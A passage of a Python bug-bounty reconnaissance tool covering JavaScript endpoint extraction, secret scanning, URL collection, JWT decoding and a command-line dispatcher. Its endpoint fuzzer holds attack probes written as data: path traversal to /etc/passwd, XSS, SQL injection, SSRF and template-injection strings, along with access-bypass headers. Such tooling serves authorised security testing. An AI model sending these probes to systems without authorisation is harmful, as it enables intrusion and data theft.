        if EnhancedBase64Toolkit:
            self._impl = EnhancedBase64Toolkit(input_string=input_string)
        else:
            self._impl = _LegacyBase64Toolkit(input_string=input_string)
        self.input_string = input_string
        self.decoded_results: Dict[str, Any] = {}

    def __getattr__(self, name):
        return getattr(self._impl, name)


class BatchProcessor:
    """Backward-compatible BatchProcessor — delegates to enhanced module."""
    def __init__(self, items=None, worker_func=None, max_workers=10, rate_limit=0.1, progress_callback=None):
        if EnhancedBatchProcessor:
            self._impl = EnhancedBatchProcessor(items=items, worker_func=worker_func, max_workers=max_workers, rate_limit=rate_limit)
        else:
            self._impl = _LegacyBatchProcessor(items, worker_func, max_workers, rate_limit, progress_callback)
        self.items = items or []
        self.results: List[Dict[str, Any]] = []
        self.errors: List[Dict[str, Any]] = []

    def __getattr__(self, name):
        return getattr(self._impl, name)

    def execute(self) -> List[Dict[str, Any]]:
        self.results = self._impl.execute()
        return self.results


class ReportBuilder:
    """Backward-compatible ReportBuilder — delegates to enhanced module."""
    def __init__(self, platform: str = "generic"):
        if EnhancedReportBuilder:
            self._impl = EnhancedReportBuilder(platform=platform)
        else:
            self._impl = _LegacyReportBuilder(platform=platform)
        self.platform = platform.lower()
        self.findings: List[Dict[str, Any]] = []

    def __getattr__(self, name):
        return getattr(self._impl, name)

    def add_finding(self, finding: Dict[str, Any]) -> None:
        self._impl.add_finding(finding)
        self.findings = getattr(self._impl, 'findings', [])

    def save(self, filepath: str, title: str = "Bug Bounty Report") -> str:
        return self._impl.save(filepath, title)


# ═══════════════════════════════════════════════════════════════════════════════
# LEGACY FALLBACK CLASSES (when enhanced modules unavailable)
# ═══════════════════════════════════════════════════════════════════════════════

class _LegacyJSAnalyzer:
    ENDPOINT_PATTERNS = [
        re.compile(r'["\']((?:https?://|/)(?:[a-zA-Z0-9._/-]+(?:/api/|/v[0-9]+/|/rest/|/graphql|/auth/|/oauth/|/saml/|/ws/|/wss/|/socket)[a-zA-Z0-9._?=/&%-]*))["\']'),
        re.compile(r'["\'](/[a-zA-Z0-9_/.-]*(?:api|rest|graphql|auth|oauth|v1|v2|v3)[a-zA-Z0-9_/.-]*)["\']'),
        re.compile(r'["\']((?:https?://)?(?:[\w-]+\.)+[\w-]+(?:/[\w./-]+)*)["\']'),
        re.compile(r'fetch\(["\']([^"\']+)["\']'),
        re.compile(r'axios\.(?:get|post|put|patch|delete)\(["\']([^"\']+)["\']'),
        re.compile(r'\$\.(?:get|post|ajax)\(["\']([^"\']+)["\']'),
        re.compile(r'XMLHttpRequest\.open\(["\'](?:GET|POST|PUT|PATCH|DELETE|OPTIONS)["\'],\s*["\']([^"\']+)["\']'),
        re.compile(r'url:\s*["\']([^"\']+)["\']'),
        re.compile(r'path:\s*["\']([^"\']+)["\']'),
        re.compile(r'route:\s*["\']([^"\']+)["\']'),
        re.compile(r'endpoint:\s*["\']([^"\']+)["\']'),
        re.compile(r'baseURL:\s*["\']([^"\']+)["\']'),
        re.compile(r'["\'](?:https?://[^/]+)?(/graphql?)["\']'),
        re.compile(r'["\'](?:https?://[^/]+)?(/socket\.io/?)["\']'),
        re.compile(r'(?:login|signin|signup|register|auth|token|refresh|logout|session)[^a-z]', re.IGNORECASE),
    ]
    FEATURE_FLAG_PATTERNS = [
        re.compile(r'["\'](FF_[A-Z_0-9]+)["\']'),
        re.compile(r'["\'](feature_[a-zA-Z_0-9]+)["\']'),
        re.compile(r'["\'](flag_[a-zA-Z_0-9]+)["\']'),
        re.compile(r'(isEnabled|isDisabled)\s*[:=]\s*(true|false)'),
        re.compile(r'(experiment|variant|rollout)\s*[:=]\s*["\']([^"\']+)["\']'),
    ]
    SOURCEMAP_PATTERN = re.compile(r'//#\s*sourceMappingURL\s*=\s*(.+\.map)')
    INTERNAL_DOMAIN_PATTERNS = [
        re.compile(r'["\'](https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|10\.\d+\.\d+\.\d+|172\.1[6-9]\.\d+\.\d+|172\.2[0-9]\.\d+\.\d+|172\.3[0-1]\.\d+\.\d+|192\.168\.\d+\.\d+)[^"\']*)["\']'),
        re.compile(r'["\'](https?://[\w-]+\.internal[^"\']*)["\']'),
        re.compile(r'["\'](https?://[\w-]+\.local[^"\']*)["\']'),
    ]
    def __init__(self, source_url: str = "", content: str = ""):
        self.source_url = source_url; self.content = content; self.endpoints = []; self.secrets = []; self.feature_flags = []; self.source_map_url = None; self.internal_endpoints = []; self.results = {}
    def load(self) -> bool:
        if self.content: return True
        if not self.source_url: return False
        if self.source_url.startswith(("http://", "https://")): return self._load_from_url()
        return self._load_from_file()
    def _load_from_url(self) -> bool:
        if not REQUESTS_AVAILABLE: return False
        try:
            resp = requests.get(self.source_url, headers=REQUIRED_HEADERS, timeout=CONFIG["timeout"], verify=CONFIG["verify_ssl"]); resp.raise_for_status()
            self.content = resp.text; return True
        except Exception: return False
    def _load_from_file(self) -> bool:
        try:
            with open(self.source_url, "r", encoding="utf-8", errors="ignore") as f: self.content = f.read(); return True
        except Exception: return False
    def extract_endpoints(self) -> List[str]:
        if not self.content: return []
        found = set()
        for p in self.ENDPOINT_PATTERNS:
            for m in p.findall(self.content):
                ep = m.strip("\"'` ")
                if ep and len(ep) > 2 and not ep.startswith(("./", "../", "data:", "blob:")): found.add(ep)
        self.endpoints = sorted(found); return self.endpoints
    def extract_secrets(self) -> List[Dict[str, Any]]:
        if not self.content: return []
        s = SecretScanner(context_lines=1); self.secrets = s.scan_text(self.content, source_label=self.source_url or "js_bundle"); return self.secrets
    def extract_feature_flags(self) -> List[Dict[str, str]]:
        if not self.content: return []
        flags = []
        for p in self.FEATURE_FLAG_PATTERNS:
            for m in p.finditer(self.content):
                d = {"value": m.group(0), "type": "feature_flag"}
                if m.lastindex and m.lastindex >= 1: d["key"] = m.group(1); flags.append(d)
        seen = set(); self.feature_flags = []
        for f in flags:
            if f["value"] not in seen: seen.add(f["value"]); self.feature_flags.append(f)
        return self.feature_flags
    def extract_source_map(self) -> Optional[str]:
        if not self.content: return None
        m = self.SOURCEMAP_PATTERN.search(self.content)
        if m: self.source_map_url = m.group(1).strip()
        return self.source_map_url
    def extract_internal_endpoints(self) -> List[str]:
        if not self.content: return []
        found = set()
        for p in self.INTERNAL_DOMAIN_PATTERNS:
            for m in p.finditer(self.content):
                u = m.group(1).strip("\"'")
                if "://" in u: found.add(u)
        self.internal_endpoints = sorted(found); return self.internal_endpoints
    def diff(self, other: str, la: str = "a", lb: str = "b") -> Dict[str, Any]:
        a = self.content.splitlines(keepends=False) if self.content else []; b = other.splitlines(keepends=False) if other else []
        sa, sb = set(a), set(b); added = [l for l in b if l not in sa]; removed = [l for l in a if l not in sb]
        return {"label_a": la, "label_b": lb, "lines_a_total": len(a), "lines_b_total": len(b), "added": added[:500], "added_count": len(added), "removed": removed[:500], "removed_count": len(removed)}
    def analyze_all(self) -> Dict[str, Any]:
        if not self.load(): return {"error": "Failed to load content"}
        self.results = {"source": self.source_url, "size_bytes": len(self.content), "endpoints": self.extract_endpoints(), "secrets": self.extract_secrets(), "feature_flags": self.extract_feature_flags(), "source_map": self.extract_source_map(), "internal_endpoints": self.extract_internal_endpoints(), "analysis_time": datetime.now().isoformat()}
        return self.results
    def output_json(self, filepath: Optional[str] = None) -> str:
        if not self.results: self.results = self.analyze_all()
        j = json.dumps(self.results, indent=2, default=str)
        if filepath:
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f: f.write(j)
        return j


class _LegacyURLCollector:
    TAG_PATTERNS = {
        "a": re.compile(r'<a[^>]+href=["\']([^"\']+)["\']', re.IGNORECASE),
        "link": re.compile(r'<link[^>]+href=["\']([^"\']+)["\']', re.IGNORECASE),
        "script": re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "img": re.compile(r'<img[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
        "form": re.compile(r'<form[^>]+action=["\']([^"\']+)["\']', re.IGNORECASE),
        "iframe": re.compile(r'<iframe[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
    }
    IGNORE_PATTERNS = re.compile(r'^(javascript|mailto|tel|sms|fax|skype|whatsapp|data|blob|#):', re.IGNORECASE)
    def __init__(self, source_url: str = ""):
        self.source_url = source_url; self.base_url = source_url; self.scope_domains = []; self.urls = set(); self.tag_counts = {}; self.html_content = ""
    def load_html(self, html: str) -> None: self.html_content = html
    def fetch(self, url: Optional[str] = None) -> bool:
        t = url or self.source_url
        if not t or not REQUESTS_AVAILABLE: return False
        try:
            r = requests.get(t, headers=REQUIRED_HEADERS, timeout=CONFIG["timeout"], verify=CONFIG["verify_ssl"]); r.raise_for_status()
            self.html_content = r.text; self.source_url = t; self.base_url = t; return True
        except Exception: return False
    def set_scope(self, domains: List[str]) -> None: self.scope_domains = [d.lower().lstrip("*.") for d in domains]
    def _is_in_scope(self, url: str) -> bool:
        if not self.scope_domains: return True
        try: h = urlparse(url).hostname or ""; return any(d in h.lower() or h.lower().endswith("." + d) for d in self.scope_domains)
        except Exception: return False
    def is_valid_url(self, url: str) -> bool:
        if not url or len(url) < 3 or self.IGNORE_PATTERNS.match(url): return False
        if url.startswith("//"): url = "https:" + url
        try: p = urlparse(url); return bool(p.netloc) and bool(p.scheme)
        except Exception: return False
    def resolve_url(self, url: str) -> Optional[str]:
        url = url.strip()
        if not url or len(url) < 2: return None
        if url.startswith("//"): return "https:" + url
        if url.startswith(("http://", "https://")): return url
        try:
            if self.base_url:
                a = urljoin(self.base_url, url); p = urlparse(a); return f"{p.scheme}://{p.netloc}{p.path}{'?' + p.query if p.query else ''}"
        except Exception: pass
        return None
    def extract_urls_from_html(self) -> List[str]:
        if not self.html_content: return []
        self.urls.clear(); self.tag_counts = {}
        for tag, pattern in self.TAG_PATTERNS.items():
            found = pattern.findall(self.html_content); self.tag_counts[tag] = len(found)
            for u in found:
                r = self.resolve_url(u)
                if r and self.is_valid_url(r) and self._is_in_scope(r): self.urls.add(r)
        return sorted(self.urls)
    def extract_urls_from_text(self, text: str) -> List[str]:
        for u in find_urls_in_text(text):
            if self._is_in_scope(u): self.urls.add(u)
        return sorted(self.urls)
    def get_sorted_urls(self) -> List[str]: return sorted(self.urls)
    def group_by_domain(self) -> Dict[str, List[str]]:
        g = {}
        for u in self.urls:
            try: d = urlparse(u).hostname or "unknown"; g.setdefault(d, []).append(u)
            except Exception: g.setdefault("unknown", []).append(u)
        return {k: sorted(v) for k, v in g.items()}
    def output_csv(self, filepath: str) -> None:
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f); w.writerow(["#", "URL", "Domain", "Path"])
            for i, u in enumerate(self.get_sorted_urls(), 1):
                p = urlparse(u); w.writerow([i, u, p.hostname, p.path])


class _LegacySecretScanner:
    SECRET_PATTERNS = [
        ("AWS Access Key ID", r"(?:AKIA[0-9A-Z]{16})", 0.9),
        ("AWS Secret Access Key", r"(?i)(?:(?:aws|amazon)[_-]?(?:secret|access|key|token)|secretaccesskey)[=:]['\"]?([A-Za-z0-9/+=]{40})", 0.95),
        ("GCP API Key", r"(?i)(?:AIza[0-9A-Za-z\-_]{35})", 0.9),
        ("GitHub PAT", r"(?i)(?:github[_-]?(?:pat|token|key|secret)|gh[ps]_[0-9a-zA-Z]{36})", 0.95),
        ("Slack Bot Token", r"(?:xoxb-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24})", 0.95),
        ("Stripe Live Key", r"(?i)(?:sk_live_[0-9a-zA-Z]{24,})", 0.95),
        ("JWT Token", r"(?:eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})", 0.7),
        ("Private Key", r"-----BEGIN.*PRIVATE KEY-----", 1.0),
        ("Generic Bearer Token", r"(?i)(?:bearer\s+[A-Za-z0-9\-_.]{20,})", 0.6),
        ("Generic API Key", r"(?i)(?:api[_-]?key|apikey)[=:]['\"]?([a-f0-9]{32,40})", 0.7),
        ("Generic Secret", r"(?i)(?:secret|token|password|passwd)\s*[:=].{20,60}", 0.5),
    ]
    FALSE_POSITIVE_PATTERNS = [re.compile(r"(?:example|sample|test|dummy|placeholder)", re.IGNORECASE)]
    def __init__(self, context_lines: int = 2, min_confidence: float = 0.5):
        self.context_lines = context_lines; self.min_confidence = min_confidence; self.findings = []
        self._compiled = [(n, re.compile(p), c) for n, p, c in self.SECRET_PATTERNS]
    def scan_text(self, text: str, source_label: str = "text") -> List[Dict[str, Any]]:
        self.findings = []
        for pattern_name, compiled_re, base_conf in self._compiled:
            for m in compiled_re.finditer(text):
                conf = base_conf
                if conf >= self.min_confidence:
                    ln = text[:m.start()].count("\n") + 1
                    self.findings.append(SecretFinding(type=pattern_name, value=m.group(0)[:500], context=f"Line {ln}", confidence=round(conf, 2), line_number=ln, source=source_label, pattern_name=pattern_name))
        seen = set(); deduped = []
        for f in self.findings:
            k = f"{f.type}:{f.value[:80]}"
            if k not in seen: seen.add(k); deduped.append(f)
        self.findings = deduped; return [asdict(f) for f in self.findings]
    def scan_file(self, filepath: str) -> List[Dict[str, Any]]:
        if not os.path.isfile(filepath): return []
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f: return self.scan_text(f.read(), source_label=filepath)
        except Exception: return []
    def scan_directory(self, directory: str, extensions: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        if not os.path.isdir(directory): return []
        all_f = []
        for root, dirs, files in os.walk(directory):
            dirs[:] = [d for d in dirs if d not in (".git", "node_modules", "__pycache__")]
            for fn in files:
                fp = os.path.join(root, fn)
                if extensions and not any(fn.endswith(e) for e in extensions): continue
                try:
                    if os.path.getsize(fp) > 10 * 1024 * 1024: continue
                    all_f.extend(self.scan_file(fp))
                except Exception: continue
        return all_f
    def get_summary(self) -> Dict[str, Any]:
        tc = {}
        for f in self.findings: tc[f.type] = tc.get(f.type, 0) + 1
        return {"total_findings": len(self.findings), "unique_types": len(tc), "by_type": dict(sorted(tc.items(), key=lambda x: -x[1])), "high": sum(1 for f in self.findings if f.confidence >= 0.9), "medium": sum(1 for f in self.findings if 0.7 <= f.confidence < 0.9), "low": sum(1 for f in self.findings if f.confidence < 0.7)}


class _LegacyEndpointFuzzer:
    COMMON_PARAMS = ["id", "user_id", "userId", "uid", "username", "email", "token", "key", "api_key", "secret", "auth", "page", "limit", "offset", "q", "query", "search", "callback", "redirect", "url", "next"]
    PARAM_VALUES = ["", "1", "true", "null", "admin", "../../etc/passwd", "<script>alert(1)</script>", "' OR '1'='1", "http://localhost", "{{7*7}}"]
    METHOD_VARIANTS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
    def __init__(self, base_url: str, method: str = "GET", params: Optional[Dict[str, str]] = None):
        self.base_url = base_url; self.method = method.upper(); self.params = params or {}; self.variants = []
        parsed = urlparse(base_url)
        for k, v in parse_qs(parsed.query, keep_blank_values=True).items(): self.params[k] = v[0] if v else ""
        self.clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    def generate_param_permutations(self) -> List[Dict[str, Any]]:
        self.variants = []
        for key in list(self.params.keys()):
            self.variants.append({"url": self.clean_url, "params": {k: v for k, v in self.params.items() if k != key}, "method": self.method, "description": f"Remove: {key}"})
        for pn in self.COMMON_PARAMS[:15]:
            if pn not in self.params:
                for val in self.PARAM_VALUES[:3]:
                    np = dict(self.params); np[pn] = val; self.variants.append({"url": self.clean_url, "params": np, "method": self.method, "description": f"Add {pn}={val}"})
        for key in list(self.params.keys()):
            for val in self.PARAM_VALUES:
                np = dict(self.params); np[key] = val; self.variants.append({"url": self.clean_url, "params": np, "method": self.method, "description": f"Set {key}={val}"})
        return self.variants
    def generate_method_variants(self) -> List[Dict[str, Any]]:
        for m in self.METHOD_VARIANTS:
            if m != self.method: self.variants.append({"url": self.clean_url, "params": dict(self.params), "method": m, "description": f"Method: {m}"})
        return [v for v in self.variants if v.get("description", "").startswith("Method")]
    def generate_header_variants(self) -> List[Dict[str, str]]:
        return [{"Content-Type": "application/x-www-form-urlencoded"}, {"Content-Type": "application/json"}, {"Accept": "application/json"}, {"X-Forwarded-For": "127.0.0.1"}, {"X-Original-URL": "/admin"}, {"X-HTTP-Method-Override": "POST"}]
    def generate_all_variants(self) -> List[Dict[str, Any]]:
        self.generate_param_permutations(); self.generate_method_variants(); return self.variants
    def get_summary(self) -> Dict[str, Any]:
        ms = set(v["method"] for v in self.variants); up = set()
        for v in self.variants: up.update(v.get("params", {}).keys())
        return {"total_variants": len(self.variants), "base_url": self.base_url, "methods": sorted(ms), "unique_params_tested": len(up), "param_permutations": sum(1 for v in self.variants if v.get("description", "").startswith("Set")), "method_overrides": sum(1 for v in self.variants if v.get("description", "").startswith("Method"))}


class _LegacyBase64Toolkit:
    def __init__(self, input_string: str = ""): self.input_string = input_string; self.decoded_results = {}
    def set_input(self, s: str) -> None: self.input_string = s
    def decode_standard(self, data: str) -> Tuple[bool, Union[str, bytes]]:
        try: return True, base64.b64decode(data, validate=True)
        except Exception as e: return False, str(e)
    def decode_urlsafe(self, data: str) -> Tuple[bool, Union[str, bytes]]:
        try: return True, base64.urlsafe_b64decode(data + "==")
        except Exception:
            try: return True, base64.urlsafe_b64decode(data)
            except Exception as e: return False, str(e)
    def decode_all_variants(self, data: Optional[str] = None) -> Dict[str, Any]:
        t = data or self.input_string
        if not t: return {"error": "No input"}
        results = {}
        variants = {"standard": (t, self.decode_standard), "urlsafe": (t.replace("+", "-").replace("/", "_"), self.decode_urlsafe)}
        for name, (vd, dec) in variants.items():
            success, result = dec(vd)
            if success and isinstance(result, bytes):
                try: text = result.decode("utf-8")
                except UnicodeDecodeError:
                    try: text = result.decode("latin-1")
                    except Exception: text = repr(result)
                results[name] = {"success": True, "decoded_text": text, "length": len(text)}
            else: results[name] = {"success": False, "error": str(result) if not success else "unknown"}
        self.decoded_results = results; return results
    def decode_jwt_segments(self, token: str) -> Dict[str, Any]: return decode_jwt(token)
    def get_best_decoding(self) -> Optional[Dict[str, Any]]:
        if not self.decoded_results: self.decode_all_variants()
        for name, r in self.decoded_results.items():
            if r.get("success"): return {"variant": name, **r}
        return None


class _LegacyBatchProcessor:
    def __init__(self, items=None, worker_func=None, max_workers=10, rate_limit=0.1, progress_callback=None):
        self.items = items or []; self.worker_func = worker_func; self.max_workers = max(1, max_workers); self.rate_limit = max(0, rate_limit); self.progress_callback = progress_callback; self.results = []; self.errors = []; self.start_time = 0.0; self.end_time = 0.0
    def set_items(self, items: List[Any]) -> None: self.items = items
    def set_worker(self, func: Callable) -> None: self.worker_func = func
    def execute(self) -> List[Dict[str, Any]]:
        if not self.items or not self.worker_func: return []
        self.start_time = time.time(); self.results = []; self.errors = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(self._worker, item, idx): idx for idx, item in enumerate(self.items)}
            for f in concurrent.futures.as_completed(futures):
                try: self.results.append(f.result(timeout=300))
                except Exception as e: self.results.append({"success": False, "error": str(e)})
        self.results.sort(key=lambda x: x.get("index", -1)); self.end_time = time.time(); return self.results
    def _worker(self, item: Any, idx: int) -> Dict[str, Any]:
        if self.rate_limit > 0: time.sleep(self.rate_limit)
        try:
            r = self.worker_func(item); return {"index": idx, "item": item, "success": True, "result": r}
        except Exception as e:
            err = {"index": idx, "item": item, "success": False, "error": str(e)}; self.errors.append(err); return err
    def get_summary(self) -> Dict[str, Any]:
        el = self.end_time - self.start_time if self.end_time else 0; s = sum(1 for r in self.results if r.get("success"))
        return {"total": len(self.items), "processed": len(self.results), "succeeded": s, "failed": len(self.errors), "elapsed": round(el, 2)}
    def output_json(self, filepath: str) -> None:
        with open(filepath, "w") as f: json.dump({"summary": self.get_summary(), "results": self.results}, f, indent=2, default=str)


class _LegacyReportBuilder:
    SEVERITY_COLORS = {"critical": "#e74c3c", "high": "#e67e22", "medium": "#f1c40f", "low": "#3498db", "info": "#95a5a6"}
    def __init__(self, platform: str = "generic"): self.platform = platform.lower(); self.findings = []
    def add_finding(self, finding: Dict[str, Any]) -> None: self.findings.append(finding)
    def _severity_badge(self, severity: str) -> str:
        s = severity.lower(); c = self.SEVERITY_COLORS.get(s, "#95a5a6"); return f"![{s}](https://img.shields.io/badge/{s}-{c.lstrip('#')})"
    def generate_markdown(self, title: str = "Bug Bounty Report") -> str:
        if not self.findings: return "# No Findings"
        sec = [f"# {title}", "", f"**Date:** {datetime.now().strftime('%Y-%m-%d')}", f"**Findings:** {len(self.findings)}", "", "## Summary", "", "| # | Title | Severity |", "|---|-------|----------|"]
        for i, f in enumerate(self.findings, 1): sec.append(f"| {i} | {f.get('title', 'Untitled')} | {self._severity_badge(f.get('severity', 'info'))} |")
        sec += ["", "## Findings", ""]
        for i, f in enumerate(self.findings, 1):
            sec.append(f"### {i}. {f.get('title', 'Untitled')}"); sec.append(f"**Severity:** {self._severity_badge(f.get('severity', 'info'))}"); sec.append(""); sec.append(f"{f.get('description', 'No description')}"); sec.append(""); sec.append("---")
        return "\n".join(sec)
    def save(self, filepath: str, title: str = "Bug Bounty Report") -> str:
        md = self.generate_markdown(title)
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f: f.write(md)
        return md


# ═══════════════════════════════════════════════════════════════════════════════
# CLI DISPATCH
# ═══════════════════════════════════════════════════════════════════════════════

def print_banner() -> None:
    print(HEADER_BANNER)


def print_usage() -> None:
    print("""
Usage:
    python python-hunter.py [options]

Options:
    --analyze-js <url|file>     Analyze a JavaScript bundle
    --scan-secrets <path>       Scan file/directory for secrets
    --collect-urls <url>        Collect URLs from a webpage
    --fuzz <url>                Generate endpoint fuzzing variants
    --decode-b64 <string>       Decode base64 variants
    --decode-jwt <token>        Decode JWT token (no verification)
    --payloads <class>          Generate test payloads (xss/ssti/sqli/ssrf/...)
    --crt <domain>              Query crt.sh for subdomains
    --hash <file>               Calculate file hash (sha256)
    --scope <domain>            Scope domain (use with --collect-urls)
    --output <dir>              Output directory (default: ./hunter_output)
    --report <file>             Generate report from findings.json
    --pipeline <steps> <tgt>    Run pipeline steps on target
    --interactive               Interactive orchestration mode
    --modules                   List available enhanced modules
    --version                   Show version info
    --help                      Show this help message

Examples:
    python python-hunter.py --analyze-js https://target.com/app.js
    python python-hunter.py --scan-secrets ./src --scope *.target.com
    python python-hunter.py --collect-urls https://target.com --scope target.com
    python python-hunter.py --decode-jwt eyJhbGciOiJIUzI1NiJ9...
    python python-hunter.py --payloads xss
    python python-hunter.py --crt target.com
    python python-hunter.py --hash /etc/passwd
    python python-hunter.py --pipeline full target.com
    python python-hunter.py --interactive
""")


def main() -> None:
    print_banner()

    args = sys.argv[1:]
    if not args or "--help" in args:
        print_usage()
        return

    if "--version" in args:
        o = Orchestrator()
        print(json.dumps(o.version_info(), indent=2))
        return

    if "--modules" in args:
        print(f"\n[+] Enhanced modules available:")
        for mod, avail in _ENHANCED_MODULES.items():
            status = "✓" if avail else "✗ (using legacy fallback)"
            print(f"    {mod}: {status}")
        print()
        return

    if "--interactive" in args:
        o = Orchestrator()
        o.interactive_menu()
        return

    output_dir = CONFIG["output_dir"]
    if "--output" in args:
        idx = args.index("--output")
        if idx + 1 < len(args):
            output_dir = args[idx + 1]
    os.makedirs(output_dir, exist_ok=True)

    scope_domains: List[str] = []
    if "--scope" in args:
        idx = args.index("--scope")
        while idx + 1 < len(args) and not args[idx + 1].startswith("--"):
            scope_domains.append(args[idx + 1])
            idx += 1

    if "--pipeline" in args:
        idx = args.index("--pipeline")
        if idx + 2 < len(args):
            pipeline_type = args[idx + 1]
            target = args[idx + 2]
            o = Orchestrator()
            if pipeline_type == "full":
                result = o.full_scan(target, scope_domains)
            else:
                steps = [s.strip() for s in pipeline_type.split(",")]
                result = o.run_pipeline(steps, target, scope_domains)
            report_path = os.path.join(output_dir, "pipeline_result.json")
            with open(report_path, "w", encoding="utf-8") as f:
                json.dump(result, f, indent=2, default=str)
            print(f"\n[+] Pipeline complete. Report: {report_path}")
            agg = o.aggregate_findings()
            print(f"    Total findings: {agg['total']}")
            for cat, count in agg.get("by_category", {}).items():
                print(f"    {cat}: {count}")
            o.export_all(output_dir)
            return
        else:
            print("[!] --pipeline requires <steps|full> <target>")

    if "--analyze-js" in args:
        idx = args.index("--analyze-js")
        if idx + 1 < len(args):
            source = args[idx + 1]
            analyzer = JSAnalyzer(source_url=source)
            results = analyzer.analyze_all()
            report_path = os.path.join(output_dir, "js_analysis.json")
            analyzer.output_json(report_path)
            print(f"\n[+] JS Analysis Summary:")
            print(f"    Endpoints: {len(results.get('endpoints', []))}")
            print(f"    Secrets: {len(results.get('secrets', []))}")
            print(f"    Feature Flags: {len(results.get('feature_flags', []))}")
            print(f"    Internal Endpoints: {len(results.get('internal_endpoints', []))}")
        else:
            print("[!] --analyze-js requires a URL or file path")

    if "--scan-secrets" in args:
        idx = args.index("--scan-secrets")
        if idx + 1 < len(args):
            path = args[idx + 1]
            scanner = SecretScanner()
            if os.path.isfile(path):
                findings = scanner.scan_file(path)
            elif os.path.isdir(path):
                findings = scanner.scan_directory(path)
            else:
                print(f"[!] Path not found: {path}", file=sys.stderr)
                findings = []
            summary = scanner.get_summary()
            print(f"\n[+] Secret Scan Summary:")
            print(f"    Total: {summary['total_findings']}")
            for st, count in summary.get("by_type", {}).items():
                print(f"      {st}: {count}")
            report_path = os.path.join(output_dir, "secrets.json")
            with open(report_path, "w", encoding="utf-8") as f:
                json.dump(findings, f, indent=2, default=str)
            print(f"[+] Secrets saved to {report_path}")
        else:
            print("[!] --scan-secrets requires a file or directory path")

    if "--collect-urls" in args:
        idx = args.index("--collect-urls")
        if idx + 1 < len(args):
            url = args[idx + 1]
            collector = URLCollector(source_url=url)
            if scope_domains:
                collector.set_scope(scope_domains)
            if collector.fetch():
                urls = collector.extract_urls_from_html()
                csv_path = os.path.join(output_dir, "urls.csv")
                collector.output_csv(csv_path)
                print(f"\n[+] URL Collection Summary:")
                print(f"    Total Unique: {len(urls)}")
                for domain, dus in collector.group_by_domain().items():
                    print(f"      {domain}: {len(dus)} URL(s)")
        else:
            print("[!] --collect-urls requires a URL")

    if "--fuzz" in args:
        idx = args.index("--fuzz")
        if idx + 1 < len(args):
            url = args[idx + 1]
            fuzzer = EndpointFuzzer(base_url=url)
            variants = fuzzer.generate_all_variants()
            summary = fuzzer.get_summary()
            report_path = os.path.join(output_dir, "fuzz_variants.json")
            with open(report_path, "w", encoding="utf-8") as f:
                json.dump(variants, f, indent=2, default=str)
            print(f"\n[+] Fuzzing Variants Generated:")
            print(f"    Total: {summary['total_variants']}")
            print(f"    Methods: {', '.join(summary['methods'])}")
            print(f"    Output: {report_path}")
        else:
            print("[!] --fuzz requires a URL")

    if "--decode-b64" in args:
        idx = args.index("--decode-b64")
        if idx + 1 < len(args):
            b64 = args[idx + 1]
            toolkit = Base64Toolkit(b64)
            results = toolkit.decode_all_variants()
            best = toolkit.get_best_decoding()
            print(f"\n[+] Base64 Decoding Results:")
            for variant, result in results.items():
                status = "✓" if result.get("success") else "✗"
                preview = result.get("decoded_text", result.get("error", ""))[:100]
                print(f"    {status} {variant}: {preview}")
            if best and best.get("success"):
                print(f"\n    Best: {best['variant']} -> {best.get('decoded_text', '')[:500]}")
        else:
            print("[!] --decode-b64 requires a base64 string")

    if "--decode-jwt" in args:
        idx = args.index("--decode-jwt")
        if idx + 1 < len(args):
            token = args[idx + 1]
            decoded = decode_jwt(token)
            print(f"\n[+] JWT Decoded:")
            print(f"    Header:  {json.dumps(decoded.get('header', {}), indent=2)}")
            print(f"    Payload: {json.dumps(decoded.get('payload', {}), indent=2)}")
        else:
            print("[!] --decode-jwt requires a token")

    if "--payloads" in args:
        idx = args.index("--payloads")
        if idx + 1 < len(args):
            bug_class = args[idx + 1]
            payloads = generate_payloads(bug_class)
            print(f"\n[+] Payloads for '{bug_class}' ({len(payloads)}):")
            for i, p in enumerate(payloads, 1):
                print(f"    {i}. {p[:120]}")
        else:
            print("[!] --payloads requires a bug class")

    if "--crt" in args:
        idx = args.index("--crt")
        if idx + 1 < len(args):
            domain = args[idx + 1]
            print(f"[+] Querying crt.sh for {domain}...")
            if EnhancedNetworkUtils:
                net = EnhancedNetworkUtils()
                domains = net.crt_sh_subdomains(domain)
            else:
                domains = extract_domains_from_crt(domain)
            print(f"\n[+] Found {len(domains)} subdomains:")
            for d in domains:
                print(f"    {d}")
            report_path = os.path.join(output_dir, f"crt_{domain}.txt")
            with open(report_path, "w", encoding="utf-8") as f:
                f.write("\n".join(domains))
        else:
            print("[!] --crt requires a domain name")

    if "--hash" in args:
        idx = args.index("--hash")
        if idx + 1 < len(args):
            filepath = args[idx + 1]
            if os.path.isfile(filepath):
                sha256 = calculate_hash(filepath, "sha256")
                md5 = calculate_hash(filepath, "md5")
                print(f"\n[+] File Hash: {filepath}")
                print(f"    SHA256: {sha256}")
                print(f"    MD5:    {md5}")
            else:
                print(f"[!] File not found: {filepath}", file=sys.stderr)
        else:
            print("[!] --hash requires a file path")

    if "--report" in args:
        idx = args.index("--report")
        if idx + 1 < len(args):
            findings_file = args[idx + 1]
            if os.path.isfile(findings_file):
                with open(findings_file, "r", encoding="utf-8") as f:
                    findings_data = json.load(f)
                builder = ReportBuilder(platform="hackerone")
                if isinstance(findings_data, list):
                    for finding in findings_data:
                        builder.add_finding(finding)
                elif isinstance(findings_data, dict):
                    builder.add_finding(findings_data)
                report_path = os.path.join(output_dir, "report.md")
                builder.save(report_path)
            else:
                print(f"[!] Findings file not found: {findings_file}", file=sys.stderr)

    if not any(flag in args for flag in [
